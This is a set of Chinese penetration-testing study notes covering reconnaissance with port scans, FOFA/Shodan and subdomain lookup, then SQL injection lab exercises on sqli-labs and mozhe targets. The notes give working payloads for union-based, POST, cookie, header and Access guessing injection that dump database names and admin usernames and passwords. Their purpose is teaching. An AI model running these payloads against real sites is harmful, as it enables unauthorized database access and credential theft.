<h3 id="5-搭建习惯-旁注-C段站点"><a href="#5-搭建习惯-旁注-C段站点" class="headerlink" title="5.搭建习惯-旁注,C段站点"></a>5.搭建习惯-旁注,C段站点</h3><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810103940947.png" alt="image-20230810103940947"></p>
<p>APP提取一键反编译提取</p>
<h2 id="网站测试思路"><a href="#网站测试思路" class="headerlink" title="网站测试思路"></a>网站测试思路</h2><p>思路：端口，接口，部分测试</p>
<p> 1、端口<img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810113104528.png" alt="image-20230810113104528"></p>
<p>2、搜索引擎搜索&#x2F;黑暗引擎搜索</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810113246306.png" alt="image-20230810113246306"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810113302832.png" alt="image-20230810113302832"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810113330998.png" alt="image-20230810113330998"></p>
<p>这些操作可以用脚本实现</p>
<p>3、发现可疑东西</p>
<p>出现在8060端口，检查源代码，看下有没有猫腻，发现出现可以漏洞，后面可以具体测试(过程没说)</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810114318561.png" alt="image-20230810114318561"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810114309313.png" alt="image-20230810114309313"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810114632727.png" alt="image-20230810114632727"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810114903902.png" alt="image-20230810114903902"></p>
<p>继续看看别的可疑端口，看到628端口，发现可以弱口令登录</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810115652689.png" alt="image-20230810115652689"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810115703596.png" alt="image-20230810115703596"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810115730078.png" alt="image-20230810115730078"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810115828472.png" alt="image-20230810115828472"> </p>
<p>旁注测试</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810151654718.png" alt="image-20230810151654718"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810151621124.png" alt="image-20230810151621124"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810151907736.png" alt="image-20230810151907736"></p>
<p>后面就类似域名查，看到防伪</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810155303098.png" alt="image-20230810155303098"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810155519943.png" alt="image-20230810155519943"></p>
<p>可以搜类似域名</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810160112684.png" alt="image-20230810160112684"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810160150203.png" alt="image-20230810160150203"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230810160158149.png" alt="image-20230810160158149"></p>
<p>APP抓数据包进行工具配合</p>
<p>各种第三方应用相关探针技术</p>
<p>各种服务接口信息相关探针技术</p>
<p> APP提取及抓包及后续配合</p>
<p>某APK一键提取反编译</p>
<p>利用burp历史抓更多URL</p>
<p>某IP无WEB框架下的第三方测试</p>
<p>45.33.42.112</p>
<p><a target="_blank" rel="noopener" href="https://www.caredaily.com/(nmap%E3%80%81fofa%E3%80%81shodan%E3%80%81%E7%AB%AF%E5%8F%A3%E7%AD%89%E7%AD%89%EF%BC%8C%E7%9F%A5%E9%81%93%E5%88%B0%E6%9C%8D%E5%8A%A1%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%90%8E%E6%9F%A5%E8%AF%A2%E6%BC%8F%E6%B4%9E)">https://www.caredaily.com/(nmap、fofa、shodan、端口等等，知道到服务、中间件后查询漏洞)</a></p>
<h2 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h2><p>便于收集整理最新exp或poc</p>
<p>便于发现相关测试目标的资产</p>
<h2 id="各种子域名查询"><a href="#各种子域名查询" class="headerlink" title="各种子域名查询"></a>各种子域名查询</h2><p>#DNS,备案,证书</p>
<p>#全球节点请求cdn</p>
<p>枚举爆破或解析子域名对应</p>
<p>便于发现管理员相关的注册信息</p>
<h2 id="黑暗引擎相关搜索"><a href="#黑暗引擎相关搜索" class="headerlink" title="黑暗引擎相关搜索"></a>黑暗引擎相关搜索</h2><p>fofa，shodan，zoomeye</p>
<h2 id="微信公众号接口获取"><a href="#微信公众号接口获取" class="headerlink" title="微信公众号接口获取"></a>微信公众号接口获取</h2><h2 id="内部群-内部应用内部接口"><a href="#内部群-内部应用内部接口" class="headerlink" title="内部群 内部应用内部接口"></a>内部群 内部应用内部接口</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/1574126/1623217705036-0b21e656-5a6b-4a72-bb81-481ab1e3c867.png?x-oss-process=image/resize,w_1295,limit_0" alt="image.png"></h2><h2 id="补天实操"><a href="#补天实操" class="headerlink" title="补天实操"></a>补天实操</h2><p>fofa</p>
<p>![(C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230811084006771.png)</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230811084141353.png" alt="image-20230811084141353"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230811084213532.png" alt="image-20230811084213532"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230811084227691.png" alt="image-20230811084227691"></p>
<p>先看网站，再看IP端口，看到一个平台</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230811084516346.png" alt="image-20230811084516346"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230811084647388.png" alt="image-20230811084647388"></p>
<p><a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh</a></p>
<p><a target="_blank" rel="noopener" href="https://dnsdb.io/">https://dnsdb.io</a></p>
<p><a target="_blank" rel="noopener" href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a></p>
<p><a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a></p>
<p><a target="_blank" rel="noopener" href="https://securitytrails.com/domain/www.baidu.com/history/a">https://securitytrails.com/domain/www.baidu.com/history/a</a></p>
<h1 id="web漏洞-基础知识点"><a href="#web漏洞-基础知识点" class="headerlink" title="web漏洞-基础知识点"></a>web漏洞-基础知识点</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1574126/1626227686171-eedc0ba2-3755-476d-8b95-5dfe9f143a86.png" alt="image.png"></p>
<h1 id="pikchu靶场"><a href="#pikchu靶场" class="headerlink" title="pikchu靶场"></a>pikchu靶场</h1><p>✧ SQL注入漏洞-数据库操作危害</p>
<p>✧ 目录遍历漏洞-源码结构泄漏危害</p>
<p>✧ 文件读取漏洞-源码内容获取危害</p>
<p>✧ 文件上传漏洞-WEB权限丢失危害</p>
<p>✧ 文件下载漏洞-补充演示拓展演示</p>
<p>小迪通过靶场演示，让我们去理解</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhicYZ6kDpHTLqo1Pfzoia3dcgHt0HxnicYfCFroG2B39AjC55luJpiavuZw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>看到这张图，才知道，我所理解的SQL注入只是冰山一角，真正庞杂的知识我还没有接触到</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230814093143082.png" alt="image-20230814093143082"></p>
<p>尝试理解一段存在sql注入的代码</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230814093245398.png" alt="image-20230814093245398"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230814093302087.png" alt="image-20230814093302087"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230814093338775.png" alt="image-20230814093338775"></p>
<p>这里可以看到，下面这句代码就是获取id的值</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230814093507047.png" alt="image-20230814093507047"></p>
<p>下面这两句代码的意思是执行sql语句，然后进行展示</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230814093718660.png" alt="image-20230814093718660"></p>
<p>操作数据库的四个步骤：1、接收，2、拼接，3、执行，4、展示 </p>
<p>如果操作不当会有驻点，例如下图通过对users表进行查询时，对emais表进行联合查询</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230814094154374.png" alt="image-20230814094154374"></p>
<p>这里有个联合查询知识点不是很懂，备注一下，</p>
<p>union是链接两个表中不重复的数据，如果有重复则会降重。这里id&#x3D;-2说明在联合查询时，让前面的表查出的结果置空，然后后面的表格查第一个数据</p>
<p>SELECT * FROM users WHERE id&#x3D;-2 union select 1, email_id,3 from emails LIMIT 0,1;</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230814113448054.png" alt="image-20230814113448054"></p>
<ul>
<li><p>上述思维导图简要说明</p>
</li>
<li><p>SQL注入安全测试中危害</p>
</li>
<li><p>SQL注入产生原理详细分析</p>
</li>
<li><ul>
<li>可控变量，带入数据库查询，变量未存在过滤或过滤不严谨</li>
</ul>
</li>
<li><p>搭建第一个SQL注入学习靶场环境</p>
</li>
<li><p>学习第一个数据库MYSQL简单注入</p>
</li>
</ul>
<p>如何判定注入点?</p>
<p>老办法 and 1&#x3D;1 页面正常</p>
<p>新办法 输入的东西有影响</p>
<h3 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h3><p>猜解列名数量（字段数） order by x 错误与正常的正常值</p>
<p><a target="_blank" rel="noopener" href="http://219.153.49.228:48354/new_list.php?id=1">http://219.153.49.228:48354/new_list.php?id=1</a> order by 4</p>
<h3 id="报错猜解准备"><a href="#报错猜解准备" class="headerlink" title="报错猜解准备"></a>报错猜解准备</h3><p><a target="_blank" rel="noopener" href="http://219.153.49.228:48354/new_list.php?id=1">http://219.153.49.228:48354/new_list.php?id=1</a> union select 1,2,3,4</p>
<p><a target="_blank" rel="noopener" href="http://219.153.49.228:48354/new_list.php?id=-1">http://219.153.49.228:48354/new_list.php?id=-1</a> union select 1,2,3,4</p>
<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>数据库版本：version()      5.7.22-0ubuntu0.16.04.1</p>
<p>数据库名字：database()     mozhe_Discuz_StormGroup</p>
<p>数据库用户：user()       root@localhost</p>
<p>操作系统：@@version_compile_os Linux</p>
<h3 id="查询指定数据库名"><a href="#查询指定数据库名" class="headerlink" title="查询指定数据库名"></a>查询指定数据库名</h3><p>mozhe_Discuz_StormGroup下的表名信息</p>
<p><a target="_blank" rel="noopener" href="http://219.153.49.228:48354/new_list.php?id=-1">http://219.153.49.228:48354/new_list.php?id=-1</a> union select</p>
<p>1,group_concat(table_name),3,4 from information_schema.tables where</p>
<p>table_schema&#x3D;’mozhe_Discuz_StormGroup’</p>
<h3 id="查询指定表名"><a href="#查询指定表名" class="headerlink" title="查询指定表名"></a>查询指定表名</h3><p>StormGroup_member下的列名信息</p>
<p><a target="_blank" rel="noopener" href="http://219.153.49.228:48354/new_list.php?id=-1">http://219.153.49.228:48354/new_list.php?id=-1</a> union select</p>
<p>1,group_concat(column_name),3,4 from information_schema.columns where</p>
<p>table_name&#x3D;’StormGroup_member’</p>
<h3 id="查询指定数据"><a href="#查询指定数据" class="headerlink" title="查询指定数据"></a>查询指定数据</h3><p>  1,name,password,4 from StormGroup_member</p>
<h3 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a>简要明确参数类型</h3><p>数字，字符，搜索，JSON等</p>
<h3 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a>简要明确请求方法</h3><p>GET,POST,COOKIE,REQUEST,HTTP头等</p>
<p>其中SQL语句干扰符号：’,”,%,),}等，具体需看写法</p>
<p>可能有些网站是以Request的方式接受参数，所以GET和POST都行 </p>
<p>注入的地方可能在User-Agent上，关键是看是否带入数据库查询。</p>
<h2 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h2><h3 id="✧-参数字符型注入测试"><a href="#✧-参数字符型注入测试" class="headerlink" title="✧ 参数字符型注入测试"></a>✧ 参数字符型注入测试</h3><p>&#x3D;&gt;sqlilabs less 5 6</p>
<p>less5:</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821101145581.png" alt="image-20230821101145581"></p>
<p>常规判断有没有注入，发现都很正常，看下源码寻找注入点</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821101346505.png" alt="image-20230821101346505"></p>
<p>看到有个”导致 当成字符串处理，所以注入时，要在id&#x3D;1和后面加个’然后再加上and 1&#x3D;1测试是否有sql注入</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/sqlilabs/Less-5/?id=1">http://127.0.0.1:8080/sqlilabs/Less-5/?id=1</a>‘ and 1&#x3D;1 </p>
<p>上述写法还是没法正确测试有sql注入，因为后面还有个单引号没有管</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/sqlilabs/Less-5/?id=1">http://127.0.0.1:8080/sqlilabs/Less-5/?id=1</a>‘ and ‘1’&#x3D;’1 </p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/sqlilabs/Less-5/?id=1">http://127.0.0.1:8080/sqlilabs/Less-5/?id=1</a>‘ and ‘1’&#x3D;’2</p>
<p>这样输入就可以测试啦。</p>
<p>最后服务器接收到的数据是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>



<p>less6</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821102948250.png" alt="image-20230821102948250"></p>
<p>观察源代码可以知道前后都有” “,所以在注入时</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/sqlilabs/Less-6/?id=1">http://127.0.0.1:8080/sqlilabs/Less-6/?id=1</a>“ and 1&#x3D;1 ..+</p>
<h3 id="✧-POST数据提交注入测试"><a href="#✧-POST数据提交注入测试" class="headerlink" title="✧ POST数据提交注入测试"></a>✧ POST数据提交注入测试</h3><p>&#x3D;&gt;sqlilabs less 11</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821103808325.png" alt="image-20230821103808325"></p>
<p>了解post注入，以及post注入产生的地方，比如下图没有任何参数，这能说明没有注入吗？</p>
<p>其实还是有可能出现注入的。 </p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821103908612.png" alt="image-20230821103908612"></p>
<p>uname&#x3D;admin’ and 1&#x3D;2 union select 1,2,3–+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
<p>uname&#x3D;admin’ and 1&#x3D;2 union select 1,2#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
<p>uname&#x3D;admin’ and 1&#x3D;2 union select database(),2#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
<h3 id="✧-参数JSON数据注入测试"><a href="#✧-参数JSON数据注入测试" class="headerlink" title="✧ 参数JSON数据注入测试"></a>✧ 参数JSON数据注入测试</h3><p>&#x3D;&gt;本地环境代码演示</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821154726616.png" alt="image-20230821154726616"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821163528635.png" alt="image-20230821163528635"></p>
<p>表达形式不一样，注入写法不一样</p>
<h3 id="✧-COOKIE数据提交注入测试"><a href="#✧-COOKIE数据提交注入测试" class="headerlink" title="✧ COOKIE数据提交注入测试"></a>✧ COOKIE数据提交注入测试</h3><p>&#x3D;&gt;sqlilabs less 20</p>
<p>less20</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821105321587.png" alt="image-20230821105321587"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821105343952.png" alt="image-20230821105343952"></p>
<p>使用sqllab,工具存在误报，通过手工注入可以验证，自己写脚本二次开发，解决误报的问题</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821105504081.png" alt="image-20230821105504081"></p>
<p>参数怎么写闭合</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821105654850.png" alt="image-20230821105654850"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821105717186.png" alt="image-20230821105717186"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821105750401.png" alt="image-20230821105750401"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821105946368.png" alt="image-20230821105946368"></p>
<p>出现没有显示完全的情况，看下源代码</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821110023355.png" alt="image-20230821110023355"></p>
<p>魔术引号</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821110055056.png" alt="image-20230821110055056"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821111109018.png" alt="image-20230821111109018"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821112615112.png" alt="image-20230821112615112"></p>
<p>利用cookie绕过</p>
<h3 id="✧-HTTP头部参数数据注入测试"><a href="#✧-HTTP头部参数数据注入测试" class="headerlink" title="✧ HTTP头部参数数据注入测试"></a>✧ HTTP头部参数数据注入测试</h3><p>&#x3D;&gt;sqlilabs less 18</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821113136708.png" alt="image-20230821113136708"></p>
<p>这说明页面在检测你的IP,之前有过类似获取IP的方式，可以查看源代码</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821113243506.png" alt="image-20230821113243506"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821113512343.png" alt="image-20230821113512343"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821113625907.png" alt="image-20230821113625907"></p>
<p>这个就是insert注入，不同于之前的select注入</p>
<p>注入语句可以在浏览器中修改头部，浏览器头部注入</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230821162644521.png" alt="image-20230821162644521"></p>
<h2 id="各种数据库介绍"><a href="#各种数据库介绍" class="headerlink" title="各种数据库介绍"></a>各种数据库介绍</h2><p>access,mysql,mssql,mongoDB,postgresql,sqlite,oracle,sybase等</p>
<p>aceess直接	表名列名数据，mysql则是 数据库名表名列名数据</p>
<p>mysql会有跨站攻击的影响，而aceess的数据库是独立的互不影响</p>
<p>mysql有函数读写，access没有借助读写的功能</p>
<h2 id="sqlmap使用笔记"><a href="#sqlmap使用笔记" class="headerlink" title="sqlmap使用笔记"></a>sqlmap使用笔记</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a></p>
<h2 id="mozhe靶场演示"><a href="#mozhe靶场演示" class="headerlink" title="mozhe靶场演示"></a>mozhe靶场演示</h2><h3 id="access数据库"><a href="#access数据库" class="headerlink" title="access数据库"></a>access数据库</h3><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822091046270.png" alt="image-20230822091046270"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822091229303.png" alt="image-20230822091229303"></p>
<p>如何判断注入点是哪个数据库：</p>
<p>asp和java接触比较多默认是access</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822091417754.png" alt="image-20230822091417754"></p>
<p>219.153.49.228:49079&#x2F;new list.asp?id&#x3D;1</p>
<p>219.153.49.228:49079&#x2F;new list.asp?id&#x3D;1 order by 4,没有错误</p>
<p>219.153.49.228:49079&#x2F;new list.asp?id&#x3D;1 order by 5,显示错误</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822091738246.png" alt="image-20230822091738246"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822091838925.png" alt="image-20230822091838925"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822091856065.png" alt="image-20230822091856065"></p>
<p>由于是access没有版本，数据库名，所以不需要获取这些东西，所以直接查数据就完事了，没有记录信息表，information表（记录表明列名），没有只能是暴力猜解</p>
<p>219.153.49.228:49079&#x2F;new listasp?id&#x3D;1 union select 1,2,3,4 from admin</p>
<p>猜个admin,有就会爆出数据</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822092105211.png" alt="image-20230822092105211"></p>
<p>219.153.49.228:49079&#x2F;new listasp?id&#x3D;1 union select 1,username,3,4 from admin</p>
<p>接着猜列名，直接猜个username</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822092242945.png" alt="image-20230822092242945"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822092338495.png" alt="image-20230822092338495"></p>
<p>当手工猜解没有头绪的时候可以使用一些工具</p>
<p>219.153.49.228:49079&#x2F;new listasp?id&#x3D;1 union select 1,username,3,passwd from admin</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822092502747.png" alt="image-20230822092502747"></p>
<p>遗留问题，access注入，如果列名和表名猜解不到，</p>
<p>access偏移注入：解决列名猜解不到的情况</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230824151028428.png" alt="image-20230824151028428"></p>
<h3 id="sqlserver数据库"><a href="#sqlserver数据库" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h3><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822093101323.png" alt="image-20230822093101323"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822093159741.png" alt="image-20230822093159741"></p>
<p>工具演示，这个演示 也可以体现注入时的一些思路，上面是sqlserver,下面是mysql注入点，可以看到界面的不同，注入思路也不同</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822093942842.png" alt="image-20230822093942842"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822094546651.png" alt="image-20230822094546651"></p>
<p>sqlserver里面sysadmin是最高权限</p>
<h3 id="postgresql数据库"><a href="#postgresql数据库" class="headerlink" title="postgresql数据库"></a>postgresql数据库</h3><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822101906173.png" alt="image-20230822101906173"></p>
<p>可以先去网上查一下注入语句和思路 </p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822103119890.png" alt="image-20230822103119890"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822102859153.png" alt="image-20230822102859153"></p>
<p>对于工具不好用时，选择sqlmap开干</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822103928071.png" alt="image-20230822103928071"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822103949381.png" alt="image-20230822103949381"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822104014907.png" alt="image-20230822104014907"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822104058519.png" alt="image-20230822104058519">看下具体注入写法，用-u -v 3查看</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822104120891.png" alt="image-20230822104120891"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822104149325.png" alt="image-20230822104149325"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822104213165.png" alt="image-20230822104213165"></p>
<p>粘贴到1后面，看下注入效果</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822104242259.png" alt="image-20230822104242259"></p>
<p>将这串base64进行解密</p>
<h3 id="oracle数据库"><a href="#oracle数据库" class="headerlink" title="oracle数据库"></a>oracle数据库</h3><p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822105844235.png" alt="image-20230822105844235"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822110345008.png" alt="image-20230822110345008"></p>
<p>工具 测一下注入点</p>
<p>再从网上搜一下注入语句</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822111036672.png" alt="image-20230822111036672"></p>
<p>mangoDB数据库</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822111353181.png" alt="image-20230822111353181"></p>
<p>因为经常和pthon一起搭建的数据库类型，</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822111441345.png" alt="image-20230822111441345"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822112108135.png" alt="image-20230822112108135"></p>
<p>工具可能用不了了sqlmap支持关系型数据库</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822113329488.png" alt="image-20230822113329488"></p>
<p>使用NoSQL进行注入，可以看下手工的情况</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822113148706.png" alt="image-20230822113148706"></p>
<p>有字符干扰，复制教程里MangoDB注入测试方法语句，</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822113529531.png" alt="image-20230822113529531"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822113558046.png" alt="image-20230822113558046"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822113618506.png" alt="image-20230822113618506"></p>
<p>获取数据库名，等等。</p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822113640640.png" alt="image-20230822113640640"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822155129785.png" alt="image-20230822155129785"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822155428149.png" alt="image-20230822155428149"></p>
<p><img src="C:\Users\xiaoxin\AppData\Roaming\Typora\typora-user-images\image-20230822155449688.png" alt="image-20230822155449688"></p>
<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
<h1 id="SQL注入报错盲注"><a href="#SQL注入报错盲注" class="headerlink" title="SQL注入报错盲注"></a>SQL注入报错盲注</h1><h3 id="基于布尔的SQL盲注-逻辑判断"><a href="#基于布尔的SQL盲注-逻辑判断" class="headerlink" title="基于布尔的SQL盲注-逻辑判断"></a>基于布尔的SQL盲注-逻辑判断</h3><p>regexp,like,ascii,left,ord,mid</p>
<h3 id="基于时间的SQL盲注-延时判断"><a href="#基于时间的SQL盲注-延时判断" class="headerlink" title="基于时间的SQL盲注-延时判断"></a>基于时间的SQL盲注-延时判断</h3><p>if,sleep</p>
<h3 id="基于报错的SQL盲注-报错回显"><a href="#基于报错的SQL盲注-报错回显" class="headerlink" title="基于报错的SQL盲注-报错回显"></a>基于报错的SQL盲注-报错回显</h3><p>floor，updatexml，extractvalue</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
<p>payload</p>
